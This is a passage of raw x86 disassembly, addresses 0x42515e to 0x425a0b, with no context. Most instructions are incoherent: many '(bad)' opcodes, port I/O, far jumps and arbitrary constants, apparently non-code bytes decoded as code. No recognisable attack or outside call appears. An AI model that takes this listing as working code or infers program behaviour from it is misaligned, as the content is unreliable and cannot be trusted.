  42515e:	add    ecx,edi
  425160:	in     al,dx
  425161:	add    al,0xd3
  425163:	mov    bl,0xc5
  425165:	into   
  425166:	loop   0x42513c
  425168:	in     eax,0xc2
  42516a:	shr    edx,0xcf
  42516d:	imul   dh
  42516f:	stc    
  425170:	rcr    esi,cl
  425172:	fst    st(3)
  425174:	stc    
  425175:	mov    ecx,0xc3da00f1
  42517b:	or     ebx,ebx
  42517d:	fiadd  DWORD PTR [edi]
  42517f:	jmp    0xd02c4391
  425184:	in     al,dx
  425185:	fsubr  QWORD PTR [esi-0x464a1419]
  42518b:	retf   0xc8d3
  42518e:	fdiv   st(7),st
  425190:	fnstenv [eax-0x23203113]
  425196:	add    esi,edi
  425198:	out    0xbc,al
  42519a:	out    0xbe,eax
  42519c:	or     al,ah
  42519e:	jmp    0x42518c
  4251a0:	add    esp,ebp
  4251a2:	shr    BYTE PTR [edi-0x484d413c],1
  4251a8:	(bad)  
  4251a9:	in     al,dx
  4251aa:	mov    dl,0xcb
  4251ac:	ffreep st(6)
  4251ae:	mov    dh,0xdf
  4251b0:	in     eax,dx
  4251b1:	icebp  
  4251b2:	int3   
  4251b3:	ret    
  4251b4:	fcomp  st(0)
  4251b6:	mov    esi,0xd7ddfdec
  4251bb:	not    bh
  4251bd:	in     eax,0xff
  4251bf:	(bad)  
  4251c0:	repnz cli 
  4251c2:	out    0xbd,eax
  4251c4:	out    dx,eax
  4251c5:	out    dx,al
  4251c6:	int    0xfb
  4251c8:	mov    al,0xe7
  4251ca:	ror    esi,1
  4251cc:	ror    dl,1
  4251ce:	sar    BYTE PTR [edi-0x2e472918],cl
  4251d4:	add    al,BYTE PTR ds:0xd20ae6c0
  4251da:	jmp    0xcbc4:0xff0305ff
  4251e1:	pinsrw mm3,esp,0xc9
  4251e5:	shl    BYTE PTR [ebp-0x10290e33],1
  4251eb:	retf   0xc6cb
  4251ee:	iret   
  4251ef:	icebp  
  4251f0:	mov    cl,0xb8
  4251f2:	add    edx,esi
  4251f4:	(bad)  
  4251f5:	out    0xfa,al
  4251f7:	add    ebx,edx
  4251f9:	sar    ebp,1
  4251fb:	aad    0xd4
  4251fd:	(bad)  
  4251fe:	aam    0xce
  425200:	out    dx,al
  425201:	adc    bh,BYTE PTR [edx+eiz*8-0x3023210f]
  425208:	mov    bh,0xe1
  42520a:	sar    BYTE PTR [ebx-0x4300410d],0xc3
  425211:	fldln2 
  425213:	fdivp  st(5),st
  425215:	repz int3 
  425217:	rcr    cl,0xfa
  42521a:	loop   0x42521a
  42521c:	fsub   st,st(0)
  42521e:	aad    0x13
  425220:	add    cl,cl
  425222:	into   
  425223:	ret    0xcabc
  425226:	ror    eax,0xf5
  425229:	mov    edx,0xfab5f3f9
  42522e:	fdiv   st,st(2)
  425230:	jmp    0xedc6:0xffdbd2f9
  425237:	jecxz  0x425243
  425239:	aad    0xdf
  42523b:	jmp    0x425242
  42523d:	jecxz  0x425217
  42523f:	fucomp st(4)
  425241:	loop   0x425213
  425243:	retf   0xb7cd
  425246:	in     al,0xc7
  425248:	shr    esi,1
  42524a:	out    dx,eax
  42524b:	in     eax,dx
  42524c:	aad    0xc5
  42524e:	mov    ecx,0xbfc9fad8
  425253:	call   0xc236185a
  425258:	jecxz  0x42523b
  42525a:	jmp    0xc40e4f44
  42525f:	hlt    
  425260:	or     eax,ebp
  425262:	jmp    0xc6cc:0xc9b2bdd2
  425269:	cmc    
  42526a:	cli    
  42526b:	aam    0xec
  42526d:	(bad)  
  42526e:	in     eax,0xf8
  425270:	ror    dh,1
  425272:	loopne 0x42526a
  425274:	rol    DWORD PTR [edx],1
  425276:	loop   0x425232
  425278:	or     cl,dl
  42527a:	mov    edi,0xd9e601f6
  42527f:	out    dx,al
  425280:	jmp    0xf0042f53
  425285:	iret   
  425286:	lods   al,BYTE PTR ds:[esi]
  425287:	jmp    0xd4393766
  42528c:	in     al,0xdb
  42528e:	mov    edx,0xbad2bffd
  425293:	clc    
  425294:	cli    
  425295:	aam    0xd5
  425297:	mov    esi,0xd0ebe0c2
  42529c:	sti    
  42529d:	fld1   
  42529f:	cld    
  4252a0:	jmp    0xe8c2:0xe1c6d2f9
  4252a7:	(bad)  
  4252a8:	aad    0xcb
  4252aa:	mov    edx,0xebc4deee
  4252af:	(bad)  
  4252b1:	into   
  4252b2:	mov    ecx,0xf8f1f1bf
  4252b7:	jecxz  0x425298
  4252b9:	ret    0xe8de
  4252bc:	(bad)  
  4252bd:	fadd   st,st(5)
  4252bf:	add    esi,ebx
  4252c1:	retf   0xb0bc
  4252c4:	lods   al,BYTE PTR ds:[esi]
  4252c5:	mov    bl,0xc3
  4252c7:	fsub   st(1),st
  4252c9:	sar    DWORD PTR [ecx-0x2b124715],1
  4252cf:	xlat   BYTE PTR ds:[ebx]
  4252d0:	std    
  4252d1:	jecxz  0x4252c3
  4252d3:	mov    edi,0xd3ddd5cc
  4252d8:	sar    edi,cl
  4252da:	(bad)  
  4252db:	retf   0xdce6
  4252de:	or     DWORD PTR [eax],ecx
  4252e0:	adc    eax,DWORD PTR [edx]
  4252e2:	test   al,0xea
  4252e4:	call   0xfc2e17a6
  4252e9:	jmp    0xeb412cc8
  4252ee:	imul   ch
  4252f0:	mov    edi,0xc7be03e2
  4252f5:	mov    esi,0xe3e0e403
  4252fa:	or     ebx,esi
  4252fc:	mov    eax,0xfc00d9eb
  425302:	(bad)  
  425303:	stos   BYTE PTR es:[edi],al
  425304:	(bad)  
  425305:	call   0xf7143fc6
  42530a:	mov    al,0xee
  42530c:	shl    ebx,1
  42530e:	sar    cl,cl
  425310:	add    bl,dl
  425312:	stc    
  425313:	shl    eax,1
  425315:	add    bh,ch
  425317:	ret    
  425318:	out    0xe4,eax
  42531a:	add    eax,0xdc8d7db
  42531f:	jecxz  0x42532d
  425321:	jmp    0x4252d0
  425323:	rol    ebp,cl
  425325:	out    dx,al
  425326:	(bad)  
  425327:	icebp  
  425328:	mov    dl,0xb1
  42532a:	mov    ebx,0xbdd8d5e8
  42532f:	fdivr  st,st(2)
  425331:	in     al,dx
  425332:	ret    0xe2e8
  425335:	int    0xe4
  425337:	fstp   TBYTE PTR [ebp+ebx*8-0x29271a17]
  42533e:	fild   WORD PTR [eax]
  425340:	fiadd  DWORD PTR [ecx]
  425342:	jecxz  0x42532e
  425344:	jecxz  0x425322
  425346:	jmp    0xece8:0xd5cdeab3
  42534d:	icebp  
  42534e:	jmp    0x425329
  425350:	repnz out dx,al
  425352:	mov    esp,0x7fd06d1
  425357:	fsubr  st(7),st
  425359:	add    al,0xc1
  42535b:	fld    QWORD PTR [edi]
  42535d:	or     esp,ebp
  42535f:	ret    0x3f8
  425362:	jmp    0xf6120b38
  425367:	out    0xf6,eax
  425369:	hlt    
  42536a:	mov    dh,0xeb
  42536d:	in     al,0xbf
  42536f:	idiv   bh
  425371:	sar    BYTE PTR [eax-0x1e0ffe3e],1
  425377:	jecxz  0x425364
  425379:	push   es
  42537a:	pop    es
  42537b:	clc    
  42537c:	aam    0xbc
  42537e:	push   cs
  42537f:	inc    esp
  425381:	push   es
  425382:	faddp  st(7),st
  425384:	in     al,dx
  425385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425386:	imul   cl
  425388:	shl    DWORD PTR [ebp-0x60d2e09],0xb9
  42538f:	in     eax,dx
  425390:	cld    
  425391:	lock int 0xd8
  425394:	(bad)  
  425395:	repz (bad) 
  425397:	pop    es
  425398:	add    ch,cl
  42539a:	loop   0x42539e
  42539c:	fmul   st,st(6)
  42539e:	add    bh,bl
  4253a0:	in     al,dx
  4253a1:	add    eax,edi
  4253a3:	mov    edi,0xc3d7d0c8
  4253a8:	enter  0xd4e6,0xd4
  4253ac:	mov    al,0xb9
  4253ae:	mov    ebx,0xdef5f0bb
  4253b3:	cld    
  4253b4:	mov    edi,0xe0ddc1d6
  4253b9:	add    edi,eax
  4253bb:	out    0x1,al
  4253bd:	fldln2 
  4253bf:	sti    
  4253c0:	cld    
  4253c1:	push   es
  4253c2:	loop   0x4253bb
  4253c4:	ret    0xcaaf
  4253c7:	jecxz  0x425393
  4253c9:	rcr    al,cl
  4253cb:	leave  
  4253cc:	(bad)  
  4253ce:	icebp  
  4253cf:	(bad)  
  4253d0:	mov    ebx,0xdde7ecd9
  4253d5:	add    al,ah
  4253d7:	(bad)
  4253da:	jmp    0xebe4:0xff0bd7d9
  4253e1:	push   cs
  4253e2:	jmp    0xdbe8:0xe0d5f3df
  4253e9:	mov    bl,0xd6
  4253eb:	repz in al,0xf6
  4253ee:	mov    bl,0xf4
  4253f0:	int3   
  4253f1:	into   
  4253f2:	cld    
  4253f3:	out    0xce,eax
  4253f5:	fnstcw WORD PTR [esi+0x60bd8db]
  4253fb:	stc    
  4253fc:	fld    QWORD PTR [ebx]
  4253fe:	std    
  4253ff:	ffreep st(5)
  425401:	iret   
  425402:	test   al,0xe5
  425404:	fst    st(7)
  425406:	retf   
  425407:	ror    eax,1
  425409:	aam    0xc0
  42540b:	jmp    0x4253c1
  42540d:	jmp    0xe0dd:0xd1bdc4ca
  425414:	in     al,dx
  425415:	(bad)  
  425417:	fdiv   st,st(6)
  425419:	in     al,0xe4
  42541b:	(bad)  
  42541d:	(bad)  
  42541e:	jmp    0xccf3:0xaa0efeed
  425425:	in     al,0xd7
  425427:	out    0xe8,al
  425429:	(bad)  
  42542a:	xlat   BYTE PTR ds:[ebx]
  42542b:	in     al,dx
  42542c:	fldpi  
  42542e:	(bad)  
  42542f:	jmp    0xd6114a12
  425434:	loope  0x42543d
  425436:	jmp    edx
  425438:	clc    
  425439:	mov    esp,0xd6ebdb00
  42543e:	hlt    
  42543f:	std    
  425440:	loope  0x42544f
  425442:	mov    dl,0xe3
  425444:	leave  
  425445:	in     eax,dx
  425446:	loopne 0x42543d
  425448:	mov    esi,0xbeebb9f3
  42544e:	icebp  
  42544f:	fadd   st,st(3)
  425451:	in     eax,dx
  425452:	add    ebx,ebx
  425454:	mov    esp,0xd1d3f4cc
  425459:	or     ebp,ebx
  42545b:	pop    es
  42545c:	out    0xc7,al
  42545e:	loope  0x42544a
  425460:	jmp    0x425471
  425462:	out    0xb1,eax
  425464:	xlat   BYTE PTR ds:[ebx]
  425465:	jecxz  0x425417
  425467:	loopne 0x42545e
  425469:	icebp  
  42546a:	cmc    
  42546b:	(bad)  [ebp-0x23a30]
  425471:	repz in al,dx
  425473:	fcmovbe st,st(1)
  425475:	cli    
  425476:	rcl    dh,cl
  425478:	fcmovnb st,st(4)
  42547a:	aam    0xde
  42547c:	add    eax,0xcf401fc
  425481:	fdivr  QWORD PTR [ebp-0x513a4c36]
  425487:	aam    0xc0
  425489:	shl    BYTE PTR [eax+edx*8-0x2e4c0606],cl
  425490:	sar    DWORD PTR [ebx-0x11083efe],cl
  425496:	(bad)  
  425497:	sar    esp,1
  425499:	out    0xe0,al
  42549b:	enter  0xe0e3,0xe3
  42549f:	fcmovnu st,st(2)
  4254a1:	adc    ebp,edx
  4254a3:	retf   0xcec5
  4254a6:	into   
  4254a7:	scas   al,BYTE PTR es:[edi]
  4254a8:	mov    bh,0xac
  4254aa:	aad    0xbb
  4254ac:	mov    dh,0xb4
  4254ae:	repnz hlt 
  4254b0:	mov    ebx,0xe0dcf5fa
  4254b5:	rol    eax,1
  4254b7:	int3   
  4254b8:	fsubr  st(5),st
  4254ba:	or     BYTE PTR [eax],cl
  4254bc:	(bad)  
  4254be:	jmp    0x42549d
  4254c0:	push   cs
  4254c1:	leave  
  4254c2:	(bad)  
  4254c3:	lock lods eax,DWORD PTR ds:[esi]
  4254c5:	shr    DWORD PTR [edi-0x4a3e2849],cl
  4254cb:	stc    
  4254cc:	in     al,0xf1
  4254ce:	(bad)  
  4254cf:	mov    eax,0xe0dbead4
  4254d4:	(bad)  
  4254d6:	push   es
  4254d7:	(bad)  
  4254d9:	cld    
  4254da:	idiv   bh
  4254dc:	push   cs
  4254dd:	out    dx,eax
  4254de:	clc    
  4254df:	fucomip st,st(6)
  4254e1:	call   0xe20407ae
  4254e6:	(bad)  
  4254e7:	xlat   BYTE PTR ds:[ebx]
  4254e8:	shr    bl,0xcf
  4254eb:	fcom   st(1)
  4254ed:	mov    al,0xdf
  4254ef:	mov    dh,0xf2
  4254f1:	(bad)  
  4254f2:	xlat   BYTE PTR ds:[ebx]
  4254f3:	mov    esp,0xf6c700d5
  4254f8:	aam    0xfe
  4254fa:	stc    
  4254fb:	test   DWORD PTR [ebx],0xde5efcb
  425501:	iret   
  425502:	ror    edi,1
  425504:	(bad)
  425507:	loopne 0x4254f6
  425509:	lock out dx,eax
  42550b:	aam    0xf1
  42550d:	in     al,dx
  42550e:	mov    edx,0xf4d1f7da
  425513:	mov    eax,0xf9e7edbd
  425518:	jmp    0x4254f9
  42551a:	idiv   esi
  42551c:	aad    0xfd
  42551e:	or     eax,0xe6ced9ff
  425523:	icebp  
  425524:	in     al,0xb7
  425526:	jmp    0xb13c09f9
  42552b:	enter  0xedb1,0xcb
  42552f:	fucomp st(7)
  425531:	icebp  
  425532:	shr    edi,cl
  425534:	fdivr  st,st(1)
  425536:	inc    bl
  425538:	(bad)  
  42553a:	call   0xf485a03
  42553f:	retf   
  425540:	fild   DWORD PTR [eax+ebx*8]
  425543:	jecxz  0x425502
  425545:	repz mov ch,0xc5
  425548:	shl    edx,1
  42554a:	icebp  
  42554b:	mov    eax,0xb8ccfad5
  425550:	retf   
  425551:	aam    0xbd
  425553:	add    al,dl
  425555:	mov    eax,0x506dfd8
  42555a:	push   es
  42555b:	sti    
  42555c:	aam    0x9
  42555e:	stc    
  42555f:	fdivp  st(3),st
  425561:	adc    ebx,edx
  425563:	xlat   BYTE PTR ds:[ebx]
  425564:	jecxz  0x425539
  425566:	mov    ebp,0xeee0fbc9
  42556b:	mov    ah,0xca
  42556d:	std    
  42556e:	repz fstp TBYTE PTR [esi+edx*8+0x3d6f4be]
  425576:	in     al,0x3
  425578:	retf   
  425579:	sti    
  42557a:	mov    DWORD PTR [edx],0xf8d4c4c8
  425580:	sti    
  425581:	add    cl,cl
  425583:	fadd   st(7),st
  425585:	(bad)  
  425586:	hlt    
  425587:	cmc    
  425588:	loop   0x42555c
  42558a:	into   
  42558b:	leave  
  42558c:	(bad)  
  42558d:	(bad)  
  42558e:	in     eax,dx
  42558f:	repnz (bad) 
  425592:	int    0xb6
  425594:	int3   
  425595:	inc    bh
  425597:	add    al,0xe4
  425599:	icebp  
  42559a:	or     ebx,ebx
  42559c:	(bad)  
  42559d:	jmp    0xe73e389a
  4255a2:	mov    ebp,0xe3c7d2bd
  4255a7:	shr    ecx,cl
  4255a9:	test   al,0xc1
  4255ab:	sti    
  4255ac:	jmp    0xd0bf:0xcecbf3c9
  4255b3:	mov    esp,0x5c5f4ce
  4255b8:	or     dl,cl
  4255ba:	out    0xc4,eax
  4255bc:	push   esp
  4255be:	add    esp,ecx
  4255c0:	push   es
  4255c1:	fmul   st,st(1)
  4255c3:	test   al,0xe5
  4255c5:	ret    0xcfac
  4255c8:	shl    BYTE PTR [edi+ebp*4-0x474a0809],0xde
  4255d0:	clc    
  4255d1:	fucomi st,st(1)
  4255d3:	in     eax,dx
  4255d4:	icebp  
  4255d5:	div    eax
  4255d7:	hlt    
  4255d8:	fdivr  QWORD PTR [ebx+eax*8-0x3722ff08]
  4255df:	cli    
  4255e0:	rcr    esp,cl
  4255e2:	stos   DWORD PTR es:[edi],eax
  4255e3:	jmp    0xe20725d7
  4255e8:	(bad)  
  4255e9:	repz fcom st(3)
  4255ec:	shr    eax,1
  4255ee:	mov    eax,0xb7cef4d9
  4255f3:	cmc    
  4255f4:	in     al,dx
  4255f5:	xlat   BYTE PTR ds:[ebx]
  4255f6:	add    ah,bh
  4255f8:	repnz add ch,cl
  4255fb:	fldpi  
  4255fd:	or     ch,bl
  4255ff:	int    0xd9
  425601:	fidivr DWORD PTR [ecx-0x3e2e1c13]
  425607:	mov    cl,0xb5
  425609:	loop   0x4255eb
  42560b:	mov    dh,0xb4
  42560d:	into   
  42560e:	shl    cl,cl
  425610:	iret   
  425611:	int3   
  425612:	out    dx,eax
  425613:	(bad)  
  425614:	shl    ecx,1
  425616:	aad    0xeb
  425618:	mov    ecx,0x4fbebe9
  42561d:	(bad)  
  42561e:	fld    QWORD PTR [ecx]
  425620:	sti    
  425621:	retf   0xddaf
  425624:	fisub  WORD PTR [ebp+ecx*8-0x36281930]
  42562b:	in     eax,dx
  42562c:	(bad)  
  42562d:	mov    ch,0xce
  42562f:	ror    al,1
  425631:	jmp    0x1403514
  425636:	mov    ebp,0x1e6dd02
  42563b:	aad    0xde
  42563d:	call   0x13035c10
  425642:	jmp    0xd4b2:0xdcd0c3de
  425649:	ror    ecx,cl
  42564b:	sti    
  42564c:	retf   0xfcd6
  42564f:	jmp    0xd7064a36
  425654:	out    dx,al
  425655:	jecxz  0x42563d
  425657:	fmul   DWORD PTR [edx]
  425659:	add    ebx,edx
  42565b:	cli    
  42565c:	in     eax,0xe8
  42565e:	hlt    
  42565f:	fsubp  st(5),st
  425661:	stc    
  425662:	retf   0xb2cf
  425665:	mov    ebp,0xeae3c1f1
  42566a:	not    ecx
  42566c:	aam    0xdb
  42566e:	enter  0x3bc,0xe8
  425672:	(bad)  
  425674:	(bad)  
  425675:	repnz fimul DWORD PTR [ebx]
  425678:	in     al,0xf8
  42567a:	mov    edi,0xcfd4ffe1
  42567f:	retf   
  425680:	int    0xec
  425682:	lods   al,BYTE PTR ds:[esi]
  425683:	repnz (bad) 
  425685:	ret    
  425686:	scas   eax,DWORD PTR es:[edi]
  425687:	out    dx,eax
  425688:	in     al,dx
  425689:	sar    BYTE PTR [ebx-0x4a143750],0xf4
  425690:	rcr    bl,cl
  425692:	fidiv  WORD PTR [esi-0x390a1e31]
  425698:	hlt    
  425699:	mov    eax,0xc6c5d7f0
  42569e:	bswap  ebx
  4256a0:	or     eax,0xe2cae6c8
  4256a5:	aad    0xe2
  4256a7:	shl    edx,0xc7
  4256aa:	in     eax,0xef
  4256ac:	mov    eax,0xccbcdbc4
  4256b1:	in     al,dx
  4256b2:	add    esi,esi
  4256b4:	int3   
  4256b5:	push   es
  4256b6:	push   edi
  4256b8:	cld    
  4256b9:	stc    
  4256ba:	icebp  
  4256bb:	fimul  WORD PTR [esi]
  4256bd:	loopne 0x4256b9
  4256bf:	into   
  4256c0:	cli    
  4256c1:	ffree  st(2)
  4256c3:	icebp  
  4256c4:	mov    edi,0xd1d6ccad
  4256c9:	jmp    0xd0ef:0xcbd9f1b6
  4256d0:	jmp    0xe5f4:0xe2dedabc
  4256d7:	(bad)  
  4256d8:	cmc    
  4256d9:	not    esi
  4256db:	add    al,0xdd
  4256dd:	jecxz  0x4256cc
  4256df:	add    ebx,esi
  4256e1:	fsubr  DWORD PTR [ecx-0x390a1852]
  4256e7:	jmp    0xe837ffa0
  4256ec:	leave  
  4256ed:	int3   
  4256ee:	mov    edx,0xd3f6fcbb
  4256f3:	aam    0xc7
  4256f5:	cli    
  4256f6:	(bad)  
  4256f8:	add    dh,al
  4256fa:	mov    edi,0xd8e7f6fb
  4256ff:	or     ah,al
  425701:	add    esi,ecx
  425703:	fsubr  st,st(6)
  425705:	into   
  425706:	in     eax,0xf3
  425708:	jecxz  0x4256f2
  42570a:	(bad)  
  42570b:	retf   0xc8d7
  42570e:	cli    
  42570f:	jmp    0x81107f0
  425714:	xlat   BYTE PTR ds:[ebx]
  425715:	out    0xed,al
  425717:	inc    DWORD PTR [eax*1-0x29f63d3f]
  42571e:	aad    0xe7
  425720:	add    bl,ch
  425722:	repz (bad) 
  425724:	fadd   st(3),st
  425726:	loope  0x425714
  425728:	out    0xf6,al
  42572a:	mov    bh,0xb9
  42572c:	test   esi,0xc8d1d4f3
  425732:	mov    edi,0xfdf2f0fd
  425737:	sar    ebp,cl
  425739:	xlat   BYTE PTR ds:[ebx]
  42573a:	lock rcl edi,0xc0
  42573e:	(bad)  
  42573f:	hlt    
  425740:	add    ecx,DWORD PTR [edx]
  425742:	ret    0xcba6
  425745:	mov    cl,0xe2
  425747:	rol    ecx,cl
  425749:	int    0xed
  42574b:	out    dx,al
  42574c:	(bad)  
  42574d:	clc    
  42574e:	aad    0xe3
  425750:	jmp    0x425741
  425752:	loope  0x425728
  425754:	stc    
  425755:	fcomp  st(7)
  425757:	loope  0x425751
  425759:	rcr    eax,0xe5
  42575c:	aam    0xd6
  42575e:	fld1   
  425760:	in     al,dx
  425761:	or     ebx,ecx
  425763:	fadd   st(6),st
  425765:	in     eax,0xd5
  425767:	mov    bh,0xf2
  425769:	sti    
  42576a:	stc    
  42576b:	mov    edx,0xd4cbe4f8
  425770:	rcl    ah,cl
  425772:	fcos   
  425774:	mov    eax,0xe7daf6f5
  425779:	stc    
  42577a:	fscale 
  42577c:	in     al,0x2
  42577e:	add    cl,BYTE PTR [edx]
  425780:	loopne 0x425775
  425782:	out    dx,eax
  425783:	(bad)  
  425784:	(bad)  
  425786:	jecxz  0x425778
  425788:	loopne 0x42575c
  42578a:	out    0xc0,eax
  42578c:	fcmovnbe st,st(7)
  42578e:	leave  
  42578f:	std    
  425790:	retf   
  425791:	ret    0xe801
  425794:	out    0xb4,eax
  425796:	(bad)  
  425798:	repz or bh,cl
  42579b:	fld    st(6)
  42579d:	(bad)  
  42579e:	in     eax,dx
  42579f:	or     eax,0xa8ef0e09
  4257a4:	mov    esi,0xdab4b7ed
  4257a9:	retf   
  4257aa:	shl    BYTE PTR [edx+ecx*8-0x112f2802],1
  4257b1:	mov    ah,0xd0
  4257b3:	in     al,dx
  4257b4:	mov    edi,0xddf4e2fc
  4257b9:	stc    
  4257ba:	icebp  
  4257bb:	add    bl,bl
  4257bd:	(bad)  
  4257be:	stc    
  4257bf:	iret   
  4257c0:	ror    DWORD PTR [edi],cl
  4257c2:	in     eax,dx
  4257c3:	mov    edi,0xf2afcdd2
  4257c8:	cmc    
  4257c9:	rcl    dl,0xf5
  4257cc:	mov    ch,0xe5
  4257ce:	in     al,0xda
  4257d0:	cld    
  4257d1:	mov    edx,0xd3e0ddce
  4257d6:	sar    BYTE PTR [edx-0x1af7182f],0xc0
  4257dd:	fsubr  st(6),st
  4257df:	xadd   edx,esp
  4257e2:	sar    BYTE PTR [esi-0x853421f],1
  4257e8:	ret    
  4257e9:	mov    ah,0xfb
  4257eb:	jmp    0xb9182eef
  4257f0:	retf   0xb8fb
  4257f3:	idiv   DWORD PTR [esi-0x3800133e]
  4257f9:	cld    
  4257fa:	pop    es
  4257fb:	in     al,0xde
  4257fd:	cld    
  4257fe:	out    0xf9,eax
  425800:	add    dh,bh
  425802:	mov    dl,0xc5
  425804:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425806:	not    ebx
  425808:	shl    eax,1
  42580a:	in     eax,dx
  42580b:	jmp    0xb5184c01
  425810:	repnz mov eax,0xc3ddbde1
  425816:	clc    
  425817:	aam    0xb
  425819:	fucomp st(2)
  42581b:	mov    esi,0xf8f4fb08
  425820:	int3   
  425821:	fstp   st(5)
  425823:	lods   al,BYTE PTR ds:[esi]
  425824:	xlat   BYTE PTR ds:[ebx]
  425825:	cmc    
  425826:	ret    
  425827:	loopne 0x425812
  425829:	shl    BYTE PTR [ebx+ebx*8-0x2e263405],0xed
  425831:	clc    
  425832:	cld    
  425833:	rcr    ebp,0xfb
  425836:	(bad)  
  425837:	add    dh,ch
  425839:	(bad)  
  42583a:	in     al,0xfe
  42583c:	(bad)  
  42583e:	cld    
  42583f:	(bad)  
  425840:	(bad)
  425843:	into   
  425844:	mov    bl,0xb2
  425846:	lods   al,BYTE PTR ds:[esi]
  425847:	mov    cl,0xe6
  425849:	out    0xef,al
  42584b:	iret   
  42584c:	out    0xf5,al
  42584e:	std    
  42584f:	repz ror esi,1
  425852:	mov    bh,0xf1
  425854:	(bad)  
  425855:	in     al,dx
  425856:	out    0xc5,eax
  425858:	in     al,0xde
  42585a:	in     al,0xd7
  42585c:	cmc    
  42585d:	in     eax,dx
  42585e:	sti    
  42585f:	mov    ch,0xe1
  425862:	mov    eax,0xadecccd1
  425867:	enter  0xd5c7,0xe0
  42586b:	sti    
  42586c:	fcmovb st,st(4)
  42586e:	retf   
  42586f:	stc    
  425870:	jmp    0xe6fe:0x3e8e9cf
  425877:	clc    
  425878:	imul   ebx
  42587a:	(bad)  
  42587c:	or     cl,ch
  42587e:	cli    
  42587f:	(bad)  
  425880:	loopne 0x42588a
  425882:	fdivr  st(2),st
  425884:	loope  0x425878
  425886:	mov    ebp,0xe4d7facd
  42588b:	retf   0xd6ce
  42588e:	jmp    0xc0f9:0xe0d2d9f3
  425895:	ret    
  425896:	aam    0xec
  425898:	ret    0xc000
  42589b:	out    dx,eax
  42589c:	out    dx,eax
  42589d:	into   
  42589e:	retf   
  42589f:	iret   
  4258a0:	into   
  4258a1:	out    0xe9,eax
  4258a3:	call   0xc6143b79
  4258a8:	shl    DWORD PTR [esi-0x82c1008],cl
  4258ae:	rcl    cl,1
  4258b0:	(bad)  
  4258b1:	mov    ebx,0xe2c203f1
  4258b6:	jecxz  0x42587e
  4258b8:	std    
  4258b9:	fndisi(8087 only) 
  4258bb:	jmp    0xf215b81
  4258c0:	push   cs
  4258c1:	jmp    0xe0c5:0xebcfafd0
  4258c8:	mov    ebx,0xb7badbf5
  4258cd:	sar    BYTE PTR [edx-0xa4f1c2e],cl
  4258d3:	add    dh,al
  4258d5:	mov    esi,0xdee300c7
  4258da:	(bad)  
  4258db:	in     eax,0x7
  4258dd:	fdivr  st,st(3)
  4258df:	int    0xf9
  4258e1:	jmp    0xcb332292
  4258e6:	scas   eax,DWORD PTR es:[edi]
  4258e7:	in     eax,0xc8
  4258e9:	out    dx,eax
  4258ea:	(bad)  
  4258eb:	sti    
  4258ec:	mov    al,0xcd
  4258ee:	clc    
  4258ef:	ror    eax,1
  4258f1:	mov    ah,0xd9
  4258f3:	shl    cl,0xfe
  4258f6:	add    bh,BYTE PTR [eax+eiz*8-0x15413e0e]
  4258fd:	add    al,0xc6
  4258ff:	out    0xee,al
  425901:	add    al,0xe4
  425903:	fmul   st(4),st
  425905:	in     eax,0xf0
  425907:	retf   0xc4c8
  42590a:	fmul   st,st(7)
  42590c:	lods   eax,DWORD PTR ds:[esi]
  42590d:	shl    dh,cl
  42590f:	add    edx,eax
  425911:	std    
  425912:	fidivr DWORD PTR [edx-0x3f410243]
  425918:	(bad)  
  425919:	ffreep st(0)
  42591b:	in     eax,0x1
  42591d:	push   es
  42591e:	pop    es
  42591f:	add    bh,bh
  425921:	icebp  
  425922:	stos   BYTE PTR es:[edi],al
  425923:	les    edi,FWORD PTR [esi-0x3b4c165c]
  425929:	mov    dh,0xea
  42592b:	(bad)  
  42592c:	mov    cl,0xf6
  42592e:	clc    
  42592f:	mov    ch,0xfa
  425931:	xlat   BYTE PTR ds:[ebx]
  425932:	add    ah,cl
  425934:	(bad)  
  425935:	mov    edi,0xdbdabed3
  42593a:	pop    es
  42593b:	fstp   st(3)
  42593d:	fcmovne st,st(2)
  42593f:	cld    
  425940:	call   0xe3f33244
  425945:	mov    al,0xaf
  425947:	cmc    
  425948:	mov    al,0xc4
  42594a:	loope  0x42592c
  42594c:	leave  
  42594d:	mov    ebx,0xdcd6fdb4
  425952:	iret   
  425953:	icebp  
  425954:	loopne 0x42594d
  425956:	shl    ecx,1
  425958:	add    BYTE PTR ds:0xc0c8db08,al
  42595e:	cld    
  42595f:	repz jmp 0xec2e4373
  425965:	mov    dl,0xb1
  425967:	out    dx,eax
  425968:	retf   
  425969:	loopne 0x42592b
  42596b:	call   0xb70f4058
  425970:	add    bl,ah
  425972:	int    0xee
  425974:	sti    
  425975:	fcomp  st(0)
  425977:	test   DWORD PTR [ecx],0xe7d9dade
  42597d:	loop   0x42597e
  42597f:	out    dx,al
  425980:	retf   
  425981:	cli    
  425982:	repz mov edi,0xceb1bcdf
  425988:	shr    edi,1
  42598a:	enter  0xf4b9,0xd0
  42598e:	(bad)  
  425990:	icebp  
  425991:	fcmovbe st,st(1)
  425993:	fidivr WORD PTR [ebp-0x270d0c0e]
  425999:	or     edx,esp
  42599b:	push   es
  42599c:	jmp    0xc855639b
  4259a1:	stc    
  4259a2:	repz scas eax,DWORD PTR es:[edi]
  4259a4:	shr    BYTE PTR [esi-0x304f2f54],cl
  4259aa:	in     al,dx
  4259ab:	cmc    
  4259ac:	fidivr DWORD PTR [esi-0x134b3525]
  4259b2:	loope  0x425986
  4259b4:	fst    st(3)
  4259b6:	mul    esi
  4259b8:	add    eax,edx
  4259ba:	mov    esp,0xc6c809dc
  4259c0:	fmul   QWORD PTR [eax]
  4259c2:	ret    0xd6e7
  4259c5:	out    dx,al
  4259c6:	(bad)  
  4259c8:	(bad)  
  4259c9:	jmp    0xcf3639c7
  4259ce:	fnstcw WORD PTR [edx-0x460c2648]
  4259d4:	clc    
  4259d5:	add    edx,ebx
  4259d7:	stc    
  4259d8:	(bad)  
  4259d9:	cld    
  4259da:	icebp  
  4259db:	loop   0x4259b3
  4259dd:	(bad)  
  4259de:	into   
  4259df:	int3   
  4259e0:	leave  
  4259e1:	add    BYTE PTR [edi-0x4a4f3857],ah
  4259e7:	mov    bh,0xcd
  4259e9:	aam    0xed
  4259eb:	(bad)  
  4259ec:	mov    eax,0xb1b2e8c8
  4259f1:	fdiv   st,st(5)
  4259f3:	fcom   st(1)
  4259f5:	hlt    
  4259f6:	jecxz  0x4259d6
  4259f8:	vpsrlw xmm3,xmm0,xmm3
  4259fc:	or     bl,bl
  4259fe:	fsubr  st(6),st
  425a00:	add    eax,0xe2e5e3ce
  425a05:	into   
  425a06:	mov    al,0xc8
  425a08:	repz into 
  425a0a:	sti    
  425a0b:	xlat   BYTE PTR ds:[ebx]
